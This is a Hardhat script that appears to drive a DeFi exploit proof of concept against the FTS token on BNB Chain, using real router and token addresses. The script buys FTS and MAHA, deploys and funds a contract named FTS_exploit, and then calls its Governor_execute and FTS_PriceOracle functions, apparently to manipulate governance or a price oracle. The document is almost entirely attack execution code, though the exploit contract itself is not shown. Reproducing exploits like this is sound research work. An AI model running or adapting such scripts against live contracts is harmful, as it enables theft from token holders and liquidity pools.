// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const { ethers } = require("hardhat");
// const { expect } = require("chai");

async function main() {
  // Hardhat always runs the compile task when running scripts with its command
  // line interface.
  //
  // If this script is run directly using `node` you may want to call compile
  // manually to make sure everything is compiled
  // await hre.run('compile');

  const [signer] = await ethers.getSigners();
  console.log("signer address is: ",signer.address, "the balance of ETH is: ", await signer.getBalance());
  console.log("the block number is :", await ethers.provider.getBlockNumber());

  // const propose = await ethers.getContractFactory("FTS_propose");
  // const propose_test = await propose.deploy();
  // await propose_test.deployed();
  // console.log("propose_test deployed to:", propose_test.address);

  
  const Pancake_router = "0x10ED43C718714eb63d5aA57B78B54704E256024E";
  const Ape_router = "0xcF0feBd3f17CEf5b47b0cD257aCf6025c5BFf3b7";
  const FTS = "0x4437743ac02957068995c48E08465E0EE1769fBE";
  const BNB = "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c";
  const MAHA = "0xCE86F7fcD3B40791F63B86C3ea3B8B355Ce2685b";
  // const BNB_FTS_pair = "0xc69f2139a6Ce6912703AC10e5e74ee26Af1b4a7e";

  const erc20_abi = ["function balanceOf(address account) external view returns (uint256)", "function approve(address spender, uint256 amount) external returns (bool)", "function transferFrom(address from, address to, uint256 amount) external returns (bool)"];
  const Pancake_abi = ["function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)"];
  // const Pancake_Pair_abi = ["function getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast)"];

  const FTS_token = new ethers.Contract(FTS, erc20_abi, signer);
  const MAHA_token = new ethers.Contract(MAHA, erc20_abi, signer);
  const Pancake_Router = new ethers.Contract(Pancake_router, Pancake_abi, signer);
  const Ape_Router = new ethers.Contract(Ape_router, Pancake_abi, signer);
  // const BNB_FTS = new ethers.Contract(pair, Pancake_Pair_abi, signer);
  // console.log("get reserve0 and reserve1: ", await BNB_FTS.getReserves());


  await Pancake_Router.swapExactETHForTokens(0, [BNB, FTS], signer.address, Date.now(), {value : ethers.utils.parseEther('10')});
  await Pancake_Router.swapExactETHForTokens(0, [BNB, MAHA], signer.address, Date.now(), {value : ethers.utils.parseEther('10')});
  await Ape_Router.swapExactETHForTokens(0, [BNB, MAHA], signer.address, Date.now(), {value : ethers.utils.parseEther('10')});
  console.log("I have got FTS_token: ",await FTS_token.balanceOf(signer.address));
  console.log("I have got MAHA_token: ",await MAHA_token.balanceOf(signer.address));


  const Exploit = await ethers.getContractFactory("FTS_exploit");
  const FTS_exploit_test = await Exploit.deploy();
  await FTS_exploit_test.deployed();
  console.log("FTS_exploit_test deployed to:", FTS_exploit_test.address);

  await MAHA_token.approve(signer.address, BigInt(99999999999999999999999999999));
  await MAHA_token.transferFrom(signer.address, FTS_exploit_test.address, ethers.utils.parseEther('4'));    //4000000000000000000
  console.log("FTS_exploit_test have got MAHA: ",await MAHA_token.balanceOf(FTS_exploit_test.address));

  await FTS_token.approve(signer.address, BigInt(9999999999999999999999999999));
  await FTS_token.transferFrom(signer.address, FTS_exploit_test.address, ethers.utils.parseEther('100'));    //100000000000000000000
  console.log("FTS_exploit_test have got FTS: ",await FTS_token.balanceOf(FTS_exploit_test.address)); 

  // await FTS_token.approve(signer.address, BigInt(9999999999999999999999999999));
  // await FTS_token.transferFrom(signer.address, propose_test.address, ethers.utils.parseEther('40000'));    //100000000000000000000
  // console.log("FTS_exploit_test have got FTS: ",await FTS_token.balanceOf(propose_test.address));

  // await propose_test.propose_a_proposal();
  // We get the contract to deploy after 1 day...
//   await ethers.provider.send("evm_increaseTime", [1.5 * 24 * 60 * 60]);

  await FTS_exploit_test.Governor_execute();
  await FTS_exploit_test.FTS_PriceOracle();


}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
